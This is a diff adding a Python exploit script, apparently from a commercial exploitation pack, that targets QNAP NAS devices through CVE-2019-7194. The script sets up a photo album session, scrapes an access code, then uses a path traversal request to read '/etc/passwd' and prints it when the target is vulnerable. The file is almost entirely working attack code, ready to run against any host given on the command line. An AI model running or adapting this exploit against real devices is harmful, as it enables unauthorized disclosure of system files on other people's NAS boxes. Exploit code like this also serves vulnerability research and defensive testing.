@@ -1,0 +1,57 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+_name_   = 'd2sec_qnap_1'
+_vendor_ = 'qnap'
+_model_  = ['NAS']
+_vuln_   = 'Local File Disclosure Vulnerability'
+_cve_    = 'CVE-2019-7194'
+_ref_    = 'https://medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05'
+_port_   = 8083
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'https://%s:%d' % (host,port)
+    s = requests.Session()
+    response = s.post(url+'/photo/p/api/album.php', data={'a':'setSlideshow','f':'qsamplealbum'}, verify=False)
+    m = re.search('<status>0</status><output>([^<]+)</output>', response.text)
+    if m is None:
+        print '[+] %s not vulnerable' % host
+        return
+    album = m.group(1)    
+    response = s.get(url+'/photo/slideshow.php?album=%s'%album, verify=False)
+    m = re.search('code: encodeURIComponent\(\'([^\']+)\'\)', response.text)
+    if m is None:
+        print '[+] %s not vulnerable' % host    
+        return
+    ac = m.group(1)
+    response = s.post(url+'/photo/p/api/video.php', data={'album':album,'ac':ac,'a':'caption','filename':'./../etc/passwd','f':'UMGObv'}, verify=False)                    
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if '[appuser]:' in response.text:
+    print '[+] %s vulnerable\n' % host
+    print '===\n\n%s'%response.text
+  else:            
+    print '[+] %s not vulnerable' % host
+    
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
